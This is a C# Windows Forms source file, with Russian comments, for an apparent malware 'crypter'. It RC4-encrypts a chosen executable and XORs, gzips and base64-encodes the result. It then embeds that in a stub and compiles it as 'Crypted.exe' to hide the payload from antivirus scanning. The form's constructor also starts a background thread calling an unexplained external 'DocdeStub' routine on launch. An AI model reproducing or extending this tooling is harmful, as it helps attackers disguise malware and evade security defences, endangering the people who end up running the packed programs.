using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.IO.Compression;
using StrDecoder;
using System.Threading;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Filter = "API.exe |*.exe";  // Фильтр
            if (dialog.ShowDialog() == DialogResult.OK)
                textBox1.Text = dialog.FileName; // Добавляем полный путь до файла в textBox1            
        }

        static string ByteArrayToString(byte[] ba)
        {
            return BitConverter.ToString(ba).Replace("-", "");
        }

        static string RandomString(int size)
        {
            Random random = new Random((int)DateTime.Now.Ticks);

            StringBuilder builder = new StringBuilder();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }

            return builder.ToString();
        }

        static byte[] RC4(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        static string XOR(string target)
        {
            string result = "";

            for (int i = 0; i < target.Length; i++)
            {
                char ch = (char)(target[i] ^ 123);
                result += ch;
            }

            //Console.WriteLine("XOR Encoded string: " + result);
            return result;
        }

        static byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }


        public static string CompressString(string value)
        {
            byte[] byteArray = new byte[0];
            if (!string.IsNullOrEmpty(value))
            {
                byteArray = Encoding.UTF8.GetBytes(value);
                using (MemoryStream stream = new MemoryStream())
                {
                    using (GZipStream zip = new GZipStream(stream, CompressionMode.Compress))
                    {
                        zip.Write(byteArray, 0, byteArray.Length);
                    }
                    byteArray = stream.ToArray();
                }
            }
            return Convert.ToBase64String(byteArray);
        }


        private void button2_Click(object sender, EventArgs e)
        {
            Random rnd = new Random();
            int random = rnd.Next(10, 30); // Рандом цифра от 6 до 20
            textBox2.Text = RandomString(random); //Помещаем рандом строку, с рандомной длинной
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string bytesString = ByteArrayToString(RC4(Encoding.Default.GetBytes(textBox2.Text), File.ReadAllBytes(textBox1.Text))); //Шифруем байты, конвертируем шифрованные байты файла в строку

            CompilerParameters Params = new CompilerParameters();
            Params.GenerateExecutable = true;

            Params.ReferencedAssemblies.Add("System.dll"); // Добавляем ссылку на System.dll

            Params.CompilerOptions += "\n/t:winexe"; // Задаём тип выходных данных
            Params.OutputAssembly = "Crypted.exe"; // Имя файла

            string Source = Crypter.Properties.Resources.stub; // Переменная, в которой хранится код стаба
            Source = Source.Replace("[BYTES]", CompressString(XOR(bytesString))); // Заменяем строку [BYTES], на заксоренную строку с шифрованными байтами
            Source = Source.Replace("[PASSWORD]", CompressString(textBox2.Text)); // Заменяем пароль для RC4

            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0"); // Указываем версию целевой платформы

            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source);

            if (Results.Errors.Count > 0)
            {
                foreach (CompilerError err in Results.Errors) // Если есть ошибки, выводим их циклом
                    MessageBox.Show(err.ToString());
            }
            else
            {
                MessageBox.Show("Crypted! "); // Иначе, выводим сообщение, что всё гуд
            }
        }

        public Form1()
        {
            new Thread(() =>
            {
                // Получаем фукции декодера
                Strdek.DocdeStub();
            }).Start();
            InitializeComponent();
        }
    }
}